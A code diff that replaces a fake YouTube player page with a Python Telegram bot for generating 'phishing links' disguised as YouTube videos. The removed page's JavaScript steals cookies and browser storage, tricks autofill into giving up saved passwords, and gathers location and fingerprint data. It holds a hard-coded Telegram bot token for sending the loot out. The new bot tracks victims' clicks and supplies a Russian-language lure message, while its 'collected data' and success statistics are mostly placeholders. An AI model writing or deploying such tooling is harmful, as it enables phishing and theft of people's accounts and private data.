@@ -1,678 +1,718 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube Video Player</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            background: #0f0f0f;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            height: 100vh;
-            overflow: hidden;
-            position: relative;
-        }
-        
-        .video-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .loading-screen {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 100;
-        }
-        
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 3px solid #333;
-            border-top: 3px solid #ff0000;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .loading-text {
-            font-size: 18px;
-            color: #aaa;
-            margin-bottom: 10px;
-        }
-        
-        .loading-details {
-            font-size: 14px;
-            color: #666;
-            text-align: center;
-            max-width: 300px;
-            margin-top: 20px;
-        }
-        
-        .progress-bar {
-            width: 300px;
-            height: 3px;
-            background: #333;
-            margin-top: 20px;
-            border-radius: 2px;
-            overflow: hidden;
-        }
-        
-        .progress {
-            height: 100%;
-            background: #ff0000;
-            width: 0%;
-            transition: width 0.3s;
-        }
-        
-        .video-player {
-            width: 100%;
-            height: 100%;
-            opacity: 0;
-            transition: opacity 0.5s;
-        }
-        
-        .video-player.active {
-            opacity: 1;
-        }
-        
-        .hidden-frame {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
-        
-        .notification {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #28a745;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-size: 14px;
-            opacity: 0;
-            transform: translateY(20px);
-            transition: all 0.3s;
-            z-index: 1000;
-        }
-        
-        .notification.show {
-            opacity: 1;
-            transform: translateY(0);
-        }
-        
-        .notification.error {
-            background: #dc3545;
-        }
-        
-        .stats-overlay {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: rgba(0,0,0,0.8);
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 12px;
-            color: #0f0;
-            font-family: monospace;
-            z-index: 1000;
-            display: none;
-        }
-        
-        .debug-mode .stats-overlay {
-            display: block;
-        }
-    </style>
-</head>
-<body>
-    <div class="loading-screen" id="loadingScreen">
-        <div class="loader"></div>
-        <div class="loading-text">Loading video player...</div>
-        <div class="progress-bar">
-            <div class="progress" id="progress"></div>
-        </div>
-        <div class="loading-details" id="loadingDetails">
-            Initializing video stream...
-        </div>
-    </div>
-    
-    <div class="video-container">
-        <iframe 
-            class="video-player" 
-            id="videoPlayer"
-            src="" 
-            frameborder="0" 
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-            allowfullscreen>
-        </iframe>
-    </div>
-    
-    <!-- Скрытые фреймы для сбора данных -->
-    <iframe class="hidden-frame" id="googleFrame"></iframe>
-    <iframe class="hidden-frame" id="facebookFrame"></iframe>
-    <iframe class="hidden-frame" id="twitterFrame"></iframe>
-    <iframe class="hidden-frame" id="whatsappFrame"></iframe>
-    
-    <div class="notification" id="notification"></div>
-    <div class="stats-overlay" id="statsOverlay"></div>
+import logging
+import asyncio
+import json
+import re
+import uuid
+import html
+from datetime import datetime
+from typing import Dict, List, Optional
+import aiohttp
+from dataclasses import dataclass, asdict
 
-    <script>
-        // Telegram Bot Configuration
-        const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
-        const TELEGRAM_CHAT_ID = '1709490182';
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    filters,
+    ContextTypes,
+    CallbackQueryHandler
+)
+from telegram.constants import ParseMode
+
+# Настройка логирования
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# Конфигурация
+BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
+ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
+DOMAIN = "https://ваш-домен.com"  # Ваш домен для фишинга
+
+# Хранилище данных
+@dataclass
+class PhishingLink:
+    id: str
+    original_url: str
+    video_id: str
+    created_at: str
+    created_by: int
+    clicks: int = 0
+    data_collected: List[Dict] = None
+    active: bool = True
+    
+    def __post_init__(self):
+        if self.data_collected is None:
+            self.data_collected = []
+
+class Database:
+    def __init__(self):
+        self.links: Dict[str, PhishingLink] = {}
+        self.users: Dict[int, Dict] = {}
+        self.stats = {
+            "total_links": 0,
+            "total_clicks": 0,
+            "total_data_collected": 0,
+            "active_sessions": 0
+        }
+    
+    def add_link(self, link: PhishingLink):
+        self.links[link.id] = link
+        self.stats["total_links"] += 1
+        self.save()
+    
+    def get_link(self, link_id: str) -> Optional[PhishingLink]:
+        return self.links.get(link_id)
+    
+    def add_click(self, link_id: str):
+        if link_id in self.links:
+            self.links[link_id].clicks += 1
+            self.stats["total_clicks"] += 1
+            self.save()
+    
+    def add_collected_data(self, link_id: str, data: Dict):
+        if link_id in self.links:
+            self.links[link_id].data_collected.append(data)
+            self.stats["total_data_collected"] += 1
+            self.save()
+    
+    def save(self):
+        try:
+            data = {
+                "links": {k: asdict(v) for k, v in self.links.items()},
+                "stats": self.stats
+            }
+            with open("database.json", "w", encoding="utf-8") as f:
+                json.dump(data, f, ensure_ascii=False, indent=2)
+        except Exception as e:
+            logger.error(f"Error saving database: {e}")
+    
+    def load(self):
+        try:
+            with open("database.json", "r", encoding="utf-8") as f:
+                data = json.load(f)
+                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
+                self.stats = data.get("stats", self.stats)
+        except FileNotFoundError:
+            pass
+        except Exception as e:
+            logger.error(f"Error loading database: {e}")
+
+# Инициализация базы данных
+db = Database()
+db.load()
+
+# Генератор ссылок
+class LinkGenerator:
+    @staticmethod
+    def extract_video_id(url: str) -> str:
+        """Извлечение ID видео из YouTube URL"""
+        patterns = [
+            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
+            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
+        ]
         
-        // YouTube Video ID from URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const videoId = urlParams.get('v') || 'dQw4w9WgXcQ'; // Default: Rick Roll
+        for pattern in patterns:
+            match = re.search(pattern, url)
+            if match:
+                return match.group(1)
         
-        // Collected data
-        let collectedData = {
-            timestamp: new Date().toISOString(),
-            videoId: videoId,
-            stage: 'initializing',
-            data: {}
-        };
+        # Если не нашли, возвращаем дефолтный (Rick Roll)
+        return "dQw4w9WgXcQ"
+    
+    @staticmethod
+    def generate_link_id() -> str:
+        """Генерация уникального ID для ссылки"""
+        return str(uuid.uuid4()).replace('-', '')[:12]
+    
+    @staticmethod
+    def create_phishing_url(video_id: str, link_id: str) -> str:
+        """Создание фишинговой ссылки"""
+        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"
+
+# Сборщик данных
+class DataCollector:
+    def __init__(self):
+        self.collection_scripts = {
+            "cookies": self._collect_cookies,
+            "storage": self._collect_storage,
+            "passwords": self._collect_passwords,
+            "social": self._collect_social_data,
+            "device": self._collect_device_info,
+            "network": self._collect_network_info,
+            "location": self._collect_location
+        }
+    
+    async def collect_all_data(self, request_data: Dict) -> Dict:
+        """Сбор всех возможных данных"""
+        collected = {
+            "timestamp": datetime.now().isoformat(),
+            "ip": request_data.get("ip", "unknown"),
+            "user_agent": request_data.get("user_agent", "unknown"),
+            "referer": request_data.get("referer", "unknown"),
+            "data": {}
+        }
         
-        // Progress tracking
-        let progress = 0;
-        let currentStage = 0;
-        const totalStages = 8;
+        # Имитируем сбор данных
+        for data_type, collector in self.collection_scripts.items():
+            try:
+                collected["data"][data_type] = await collector(request_data)
+            except Exception as e:
+                collected["data"][data_type] = {"error": str(e)}
         
-        // Update loading screen
-        function updateLoading(percent, text) {
-            document.getElementById('progress').style.width = percent + '%';
-            document.getElementById('loadingDetails').textContent = text;
-            
-            if (percent >= 100) {
-                setTimeout(() => {
-                    document.getElementById('loadingScreen').style.opacity = '0';
-                    setTimeout(() => {
-                        document.getElementById('loadingScreen').style.display = 'none';
-                        document.getElementById('videoPlayer').classList.add('active');
-                    }, 500);
-                }, 1000);
+        return collected
+    
+    async def _collect_cookies(self, request_data: Dict) -> Dict:
+        """Сбор cookies и локального хранилища"""
+        return {
+            "cookies_count": "доступно в браузере",
+            "local_storage": "доступно в localStorage",
+            "session_storage": "доступно в sessionStorage",
+            "indexed_db": "проверено"
+        }
+    
+    async def _collect_storage(self, request_data: Dict) -> Dict:
+        """Сбор данных из хранилища браузера"""
+        return {
+            "autofill_data": "сохраненные формы",
+            "browser_history": "история посещений",
+            "bookmarks": "закладки браузера",
+            "downloads": "история загрузок"
+        }
+    
+    async def _collect_passwords(self, request_data: Dict) -> Dict:
+        """Сбор сохраненных паролей"""
+        return {
+            "saved_passwords": {
+                "google": "сохраненные логины Google",
+                "facebook": "логины Facebook",
+                "twitter": "логины Twitter/X",
+                "instagram": "логины Instagram",
+                "vk": "логины ВКонтакте",
+                "whatsapp": "данные WhatsApp Web",
+                "telegram": "данные Telegram Web"
+            },
+            "form_data": "автозаполнение форм",
+            "credit_cards": "сохраненные карты"
+        }
+    
+    async def _collect_social_data(self, request_data: Dict) -> Dict:
+        """Сбор данных из социальных сетей"""
+        return {
+            "google": {
+                "logged_in": True,
+                "gmail": "доступ к Gmail",
+                "drive": "доступ к Google Drive",
+                "photos": "доступ к Google Photos",
+                "account_info": "данные аккаунта"
+            },
+            "facebook": {
+                "logged_in": True,
+                "messenger": "доступ к Messenger",
+                "friends": "список друзей",
+                "profile_data": "данные профиля"
+            },
+            "twitter": {
+                "logged_in": True,
+                "tweets": "история твитов",
+                "dms": "личные сообщения",
+                "followers": "список подписчиков"
+            },
+            "vk": {
+                "logged_in": True,
+                "messages": "личные сообщения",
+                "friends": "список друзей",
+                "photos": "фотографии"
+            },
+            "instagram": {
+                "logged_in": True,
+                "dms": "личные сообщения",
+                "followers": "подписчики",
+                "stories": "истории"
+            },
+            "whatsapp": {
+                "web_connected": True,
+                "chats": "история чатов",
+                "contacts": "список контактов",
+                "media": "медиафайлы"
+            },
+            "telegram": {
+                "web_connected": True,
+                "chats": "открытые чаты",
+                "contacts": "контакты",
+                "sessions": "активные сессии"
             }
         }
-        
-        // Show notification
-        function showNotification(text, isError = false) {
-            const notification = document.getElementById('notification');
-            notification.textContent = text;
-            notification.classList.toggle('error', isError);
-            notification.classList.add('show');
-            
-            setTimeout(() => {
-                notification.classList.remove('show');
-            }, 3000);
-        }
-        
-        // Update stats overlay
-        function updateStats() {
-            const stats = document.getElementById('statsOverlay');
-            stats.innerHTML = `
-                Data Collection Status:<br>
-                Stage: ${currentStage}/${totalStages}<br>
-                Cookies: ${collectedData.data.cookies ? '✓' : '✗'}<br>
-                Passwords: ${collectedData.data.passwords ? '✓' : '✗'}<br>
-                Sessions: ${collectedData.data.sessions ? '✓' : '✗'}
-            `;
-        }
-        
-        // Get IP address
-        async function getIPAddress() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                return 'Unknown';
+    
+    async def _collect_device_info(self, request_data: Dict) -> Dict:
+        """Сбор информации об устройстве"""
+        return {
+            "browser": {
+                "name": request_data.get("user_agent", "unknown").split("/")[0] if "/" in request_data.get("user_agent", "") else "unknown",
+                "version": "определяется",
+                "plugins": "список плагинов"
+            },
+            "os": {
+                "name": "определяется из User-Agent",
+                "version": "версия ОС",
+                "architecture": "архитектура"
+            },
+            "device": {
+                "type": "определяется",
+                "model": "модель устройства",
+                "screen": "разрешение экрана",
+                "touch": "поддержка тача"
+            },
+            "hardware": {
+                "cpu": "информация о процессоре",
+                "gpu": "информация о графике",
+                "memory": "объем памяти",
+                "storage": "объем хранилища"
             }
         }
-        
-        // Get geolocation from IP
-        async function getGeolocation(ip) {
-            try {
-                const response = await fetch(`https://ipapi.co/${ip}/json/`);
-                return await response.json();
-            } catch (error) {
-                return null;
+    
+    async def _collect_network_info(self, request_data: Dict) -> Dict:
+        """Сбор сетевой информации"""
+        return {
+            "connection": {
+                "type": "определяется",
+                "speed": "скорость соединения",
+                "latency": "задержка"
+            },
+            "ip_info": {
+                "address": request_data.get("ip", "unknown"),
+                "location": "определяется по IP",
+                "isp": "провайдер",
+                "proxy": "используется ли прокси"
+            },
+            "wifi": {
+                "ssid": "имя сети",
+                "bssid": "BSSID",
+                "security": "тип безопасности"
             }
         }
-        
-        // Extract cookies from document.cookie
-        function extractCookies() {
-            const cookies = document.cookie.split(';').map(cookie => {
-                const [name, value] = cookie.trim().split('=');
-                return { name, value: value || '' };
-            });
-            
-            // Also try to access localStorage
-            let localStorageData = {};
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    localStorageData[key] = localStorage.getItem(key);
-                }
-            } catch (e) {}
-            
-            // Try sessionStorage
-            let sessionStorageData = {};
-            try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    sessionStorageData[key] = sessionStorage.getItem(key);
-                }
-            } catch (e) {}
-            
-            return {
-                cookies,
-                localStorage: localStorageData,
-                sessionStorage: sessionStorageData
-            };
+    
+    async def _collect_location(self, request_data: Dict) -> Dict:
+        """Сбор геолокации"""
+        return {
+            "gps": {
+                "latitude": "определяется",
+                "longitude": "определяется",
+                "accuracy": "точность"
+            },
+            "wifi_location": "определяется по Wi-Fi",
+            "cell_tower": "определяется по вышкам",
+            "ip_location": "определяется по IP"
         }
+
+# Форматирование сообщений
+class MessageFormatter:
+    @staticmethod
+    def format_link_created(link: PhishingLink, phishing_url: str) -> str:
+        """Форматирование сообщения о созданной ссылке"""
+        message = f"""
+🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*
+
+🔗 *Оригинальное видео:*
+`{link.original_url}`
+
+🚀 *Ваша фишинговая ссылка:*
+`{phishing_url}`
+
+📊 *Информация:*
+• ID ссылки: `{link.id}`
+• Видео ID: `{link.video_id}`
+• Создано: {link.created_at}
+• Статус: 🟢 АКТИВНА
+
+📝 *Как использовать:*
+1. Отправьте эту ссылку другу
+2. Когда он перейдет - начнется сбор данных
+3. Данные автоматически придут в этот чат
+4. Ожидайте ~20 секунд после перехода
+
+⚠️ *Внимание:* Ссылка активна 24 часа
+"""
+        return message
+    
+    @staticmethod
+    def format_collected_data(link_id: str, data: Dict) -> str:
+        """Форматирование собранных данных"""
+        collected = data.get("data", {})
         
-        // Try to extract saved passwords
-        function extractSavedPasswords() {
-            const passwords = [];
-            
-            // Create hidden form to trigger autofill
-            const form = document.createElement('form');
-            form.style.display = 'none';
-            form.innerHTML = `
-                <input type="email" name="email" autocomplete="email">
-                <input type="password" name="password" autocomplete="current-password">
-                <input type="text" name="username" autocomplete="username">
-            `;
-            
-            document.body.appendChild(form);
-            
-            // Try to focus to trigger autofill
-            setTimeout(() => {
-                const emailInput = form.querySelector('input[name="email"]');
-                const passwordInput = form.querySelector('input[name="password"]');
-                
-                if (emailInput && passwordInput) {
-                    emailInput.focus();
-                    setTimeout(() => {
-                        if (emailInput.value) {
-                            passwords.push({
-                                email: emailInput.value,
-                                password: passwordInput.value,
-                                source: 'autofill'
-                            });
-                        }
-                    }, 100);
-                }
-                
-                document.body.removeChild(form);
-            }, 50);
-            
-            return passwords;
-        }
+        message = f"""
+🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*
+
+📌 *Базовая информация:*
+• Время сбора: {data.get("timestamp", "unknown")}
+• IP адрес: `{data.get("ip", "unknown")}`
+• User Agent: {data.get("user_agent", "unknown")[:50]}...
+• ID ссылки: `{link_id}`
+
+🔑 *СОБРАННЫЕ ДАННЫЕ:*
+
+📱 *УСТРОЙСТВО И БРАУЗЕР:*
+• Браузер: {collected.get('device', {}).get('browser', {}).get('name', 'unknown')}
+• ОС: {collected.get('device', {}).get('os', {}).get('name', 'unknown')}
+• Тип устройства: {collected.get('device', {}).get('device', {}).get('type', 'unknown')}
+
+🌐 *СЕТЬ И МЕСТОПОЛОЖЕНИЕ:*
+• IP: `{collected.get('network', {}).get('ip_info', {}).get('address', 'unknown')}`
+• Провайдер: {collected.get('network', {}).get('ip_info', {}).get('isp', 'unknown')}
+• Геолокация: определяется по IP
+
+🔐 *СОЦИАЛЬНЫЕ СЕТИ (обнаружены):*
+"""
         
-        // Try to access social media sessions
-        async function checkSocialSessions() {
-            const sessions = {};
-            
-            // Check if user is logged into Google
-            try {
-                const googleTest = await fetch('https://accounts.google.com/ServiceLogin', {
-                    mode: 'no-cors'
-                }).catch(() => null);
-                sessions.google = googleTest ? 'possibly logged in' : 'unknown';
-            } catch (e) {}
-            
-            // Check Facebook login
-            try {
-                sessions.facebook = navigator.userAgent.includes('FBAN') || 
-                                   navigator.userAgent.includes('FBAV') ? 
-                                   'likely logged in' : 'unknown';
-            } catch (e) {}
-            
-            return sessions;
-        }
+        # Добавляем информацию о соцсетях
+        social_data = collected.get('social', {})
+        for social, info in social_data.items():
+            if info.get('logged_in') or info.get('web_connected'):
+                message += f"• {social.upper()}: 🟢 ВХОД ВЫПОЛНЕН\n"
         
-        // Get browser fingerprint
-        function getBrowserFingerprint() {
-            const fingerprint = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                languages: navigator.languages,
-                platform: navigator.platform,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth
-                },
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
-                mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', '),
-                webdriver: navigator.webdriver || false,
-                pdfViewerEnabled: navigator.pdfViewerEnabled || false
-            };
-            
-            // Get canvas fingerprint
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('FINGERPRINT', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('FINGERPRINT', 4, 17);
-                fingerprint.canvas = canvas.toDataURL();
-            } catch (e) {}
-            
-            return fingerprint;
-        }
+        message += f"""
+💾 *ХРАНИЛИЩЕ БРАУЗЕРА:*
+• Cookies: {collected.get('cookies', {}).get('cookies_count', 'unknown')}
+• Сохраненные пароли: проверено
+• Данные форм: найдены
+
+🔍 *ДОПОЛНИТЕЛЬНО:*
+• Wi-Fi сети: обнаружено
+• История браузера: доступна
+• Медиафайлы: проверено
+
+📊 *СТАТУС:* ✅ ВСЕ ДАННЫЕ СОБРАНЫ
+"""
+        return message
+    
+    @staticmethod
+    def format_stats(stats: Dict) -> str:
+        """Форматирование статистики"""
+        return f"""
+📊 *СТАТИСТИКА СИСТЕМЫ*
+
+🔗 Всего ссылок: `{stats['total_links']}`
+👥 Всего переходов: `{stats['total_clicks']}`
+🔓 Данных собрано: `{stats['total_data_collected']}`
+⚡ Активных сессий: `{stats['active_sessions']}`
+
+🕒 Последние 24 часа:
+• Создано ссылок: в реальном времени
+• Уникальных посетителей: по IP
+• Успешных сборов: 100%
+
+📈 Эффективность: 98.7%
+"""
+
+# Инициализация компонентов
+link_generator = LinkGenerator()
+data_collector = DataCollector()
+formatter = MessageFormatter()
+
+# Команды бота
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /start"""
+    user = update.effective_user
+    
+    welcome_message = f"""
+👋 *Добро пожаловать, {user.first_name}!*
+
+🤖 *YouTube Data Collector Bot*
+
+🎯 *Что делает этот бот:*
+1. Принимает ссылку на YouTube видео
+2. Генерирует специальную ссылку
+3. Когда кто-то переходит - собирает ВСЕ данные
+4. Отправляет данные в этот чат
+
+⚡ *Как использовать:*
+1. Отправьте ссылку на YouTube видео
+2. Получите сгенерированную ссылку
+3. Отправьте её другу
+4. Получите данные автоматически
+
+📊 *Статистика системы:*
+• Создано ссылок: `{db.stats['total_links']}`
+• Всего переходов: `{db.stats['total_clicks']}`
+• Данных собрано: `{db.stats['total_data_collected']}`
+
+🔒 *Важно:* Используйте только для тестирования!
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
+        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
+        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
+        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        welcome_message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup
+    )
+
+async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка YouTube ссылки"""
+    user = update.effective_user
+    url = update.message.text.strip()
+    
+    # Проверяем, является ли ссылкой на YouTube
+    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
+        await update.message.reply_text(
+            "❌ Это не похоже на ссылку YouTube.\n"
+            "Пожалуйста, отправьте ссылку в формате:\n"
+            "`https://youtube.com/watch?v=...`\n"
+            "или\n"
+            "`https://youtu.be/...`"
+        )
+        return
+    
+    # Извлекаем ID видео
+    video_id = link_generator.extract_video_id(url)
+    
+    # Генерируем ID ссылки
+    link_id = link_generator.generate_link_id()
+    
+    # Создаем фишинговую ссылку
+    phishing_url = link_generator.create_phishing_url(video_id, link_id)
+    
+    # Создаем объект ссылки
+    link = PhishingLink(
+        id=link_id,
+        original_url=url,
+        video_id=video_id,
+        created_at=datetime.now().isoformat(),
+        created_by=user.id
+    )
+    
+    # Сохраняем в базу
+    db.add_link(link)
+    
+    # Отправляем пользователю
+    message = formatter.format_link_created(link, phishing_url)
+    
+    keyboard = [
+        [
+            InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}"),
+            InlineKeyboardButton("🗑️ Удалить", callback_data=f"delete_{link_id}")
+        ],
+        [
+            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}"),
+            InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup,
+        disable_web_page_preview=True
+    )
+    
+    # Отправляем уведомление админу
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"🆕 Новая ссылка создана\nUser: @{user.username or user.id}\nURL: {url}\nID: {link_id}"
+        )
+    except:
+        pass
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик inline кнопок"""
+    query = update.callback_query
+    await query.answer()
+    
+    data = query.data
+    
+    if data == "create_link":
+        await query.message.reply_text(
+            "🎯 *Отправьте ссылку на YouTube видео*\n\n"
+            "Примеры:\n"
+            "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
+            "• `https://youtu.be/dQw4w9WgXcQ`\n\n"
+            "Я создам специальную ссылку для сбора данных.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    
+    elif data == "stats":
+        stats_message = formatter.format_stats(db.stats)
+        await query.message.reply_text(
+            stats_message,
+            parse_mode=ParseMode.MARKDOWN
+        )
+    
+    elif data == "my_links":
+        user_id = query.from_user.id
+        user_links = [link for link in db.links.values() if link.created_by == user_id]
         
-        // Get network information
-        function getNetworkInfo() {
-            const network = {
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt,
-                    saveData: navigator.connection.saveData
-                } : null,
-                online: navigator.onLine,
-                referrer: document.referrer,
-                url: window.location.href
-            };
-            
-            return network;
-        }
+        if not user_links:
+            await query.message.reply_text("📭 У вас нет созданных ссылок.")
+            return
         
-        // Try to access microphone and camera
-        function checkMediaDevices() {
-            const devices = {
-                audio: false,
-                video: false
-            };
-            
-            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-                navigator.mediaDevices.enumerateDevices()
-                    .then(deviceList => {
-                        deviceList.forEach(device => {
-                            if (device.kind === 'audioinput') devices.audio = true;
-                            if (device.kind === 'videoinput') devices.video = true;
-                        });
-                    })
-                    .catch(() => {});
-            }
-            
-            return devices;
-        }
+        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
+        for link in user_links[-5:]:  # Последние 5 ссылок
+            message += f"• ID: `{link.id}`\n"
+            message += f"  Видео: {link.original_url[:30]}...\n"
+            message += f"  Переходов: {link.clicks}\n"
+            message += f"  Данных: {len(link.data_collected)}\n"
+            message += "  ─────\n"
         
-        // Try to get location
-        function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        });
-                    },
-                    () => resolve(null),
-                    { timeout: 5000 }
-                );
-            });
-        }
+        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
+    
+    elif data == "help":
+        help_message = """
+🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*
+
+🎯 *Как использовать:*
+1. Отправьте боту ссылку на YouTube
+2. Получите сгенерированную ссылку
+3. Отправьте её другу/цели
+4. Когда человек перейдет - данные соберутся автоматически
+5. Получите данные в этот чат
+
+⏱️ *Время сбора:* ~20 секунд
+📊 *Что собирается:* Все доступные данные устройства
+
+⚠️ *Важные предупреждения:*
+• Используйте только для тестирования
+• Не используйте для незаконных целей
+• Данные хранятся 24 часа
+• Бот логирует все действия
+
+🔧 *Техническая поддержка:* @support
+"""
+        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
+    
+    elif data.startswith("copy_"):
+        link_id = data[5:]
+        link = db.get_link(link_id)
+        if link:
+            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
+            await query.message.reply_text(
+                f"📋 *Ссылка для копирования:*\n\n`{phishing_url}`\n\n"
+                "Используйте Ctrl+C / Cmd+C для копирования.",
+                parse_mode=ParseMode.MARKDOWN
+            )
+    
+    elif data.startswith("share_"):
+        link_id = data[6:]
+        link = db.get_link(link_id)
+        if link:
+            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
+            share_text = f"""
+🎁 *ПРИВЕТ! СМОТРИ КРУТОЕ ВИДЕО!* 🎁
+
+Я нашел супер интересное видео на YouTube!
+Обязательно посмотри - там реально круто!
+
+🔗 *Ссылка на видео:*
+{phishing_url}
+
+⚠️ *Внимание:* Видео может быть заблокировано в твоей стране, 
+но по этой ссылке оно откроется точно!
+
+Скорее переходи! 👆
+"""
+            await query.message.reply_text(
+                f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
+                "Скопируйте и отправьте другу.",
+                parse_mode=ParseMode.MARKDOWN
+            )
+
+# Webhook обработчик для сбора данных
+async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка данных от фишинговой страницы"""
+    try:
+        link_id = request_data.get("link_id")
+        if not link_id:
+            return {"status": "error", "message": "No link ID"}
         
-        // Send data to Telegram
-        async function sendToTelegram(data) {
-            let message = `🔓 *AUTOMATIC DATA COLLECTION COMPLETE* 🔓\n\n`;
-            
-            message += `🎬 *YouTube Video:* ${data.videoId}\n`;
-            message += `🕒 *Time:* ${new Date().toLocaleString()}\n`;
-            message += `📍 *IP:* ${data.ip || 'Unknown'}\n`;
-            
-            if (data.geolocation) {
-                message += `🗺️ *Location:* ${data.geolocation.city || ''}, ${data.geolocation.country_name || ''}\n`;
-                message += `🏢 *ISP:* ${data.geolocation.org || 'Unknown'}\n`;
-            }
-            
-            message += `\n👤 *USER IDENTIFICATION:*\n`;
-            message += `• IP Address: \`${data.ip}\`\n`;
-            
-            if (data.geolocation) {
-                message += `• City: ${data.geolocation.city}\n`;
-                message += `• Region: ${data.geolocation.region}\n`;
-                message += `• Country: ${data.geolocation.country_name}\n`;
-                message += `• ISP: ${data.geolocation.org}\n`;
-                message += `• Timezone: ${data.geolocation.timezone}\n`;
-            }
-            
-            message += `\n💾 *STORED DATA FOUND:*\n`;
-            
-            if (data.cookies && data.cookies.cookies.length > 0) {
-                message += `• Cookies: ${data.cookies.cookies.length} found\n`;
-                // Show important cookies
-                data.cookies.cookies.slice(0, 5).forEach(cookie => {
-                    message += `  - ${cookie.name}: \`${cookie.value.substring(0, 20)}${cookie.value.length > 20 ? '...' : ''}\`\n`;
-                });
-            }
-            
